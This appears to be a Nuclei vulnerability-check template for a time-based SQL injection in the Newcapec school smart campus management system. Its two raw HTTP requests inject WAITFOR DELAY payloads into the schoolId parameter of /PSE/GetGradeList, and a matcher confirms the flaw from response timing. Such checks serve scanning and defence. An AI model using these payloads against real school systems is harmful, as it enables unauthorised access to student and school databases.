id: newcapec-smart-campus-sql
info:
  name: 新中新中小学智慧校园信息管理系统SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    新中新中小学智慧校园信息管理系统存在SQL注入安全缺陷，攻击者可通过构造恶意输入执行非授权数据库查询。
  tags: 新中新中小学智慧校园信息管理系统
http:
- raw:
  - |
    GET /PSE/GetGradeList?schoolId=1;WAITFOR%00DELAY%00'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
    accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Cookie: ASP.NET_SessionId=yathh52f1vvjxvmfqjlurzuu
    Connection: close
  - |
    GET /PSE/GetGradeList?schoolId=1;WAITFOR%00DELAY%00'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Cookie: ASP.NET_SessionId=yathh52f1vvjxvmfqjlurzuu
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
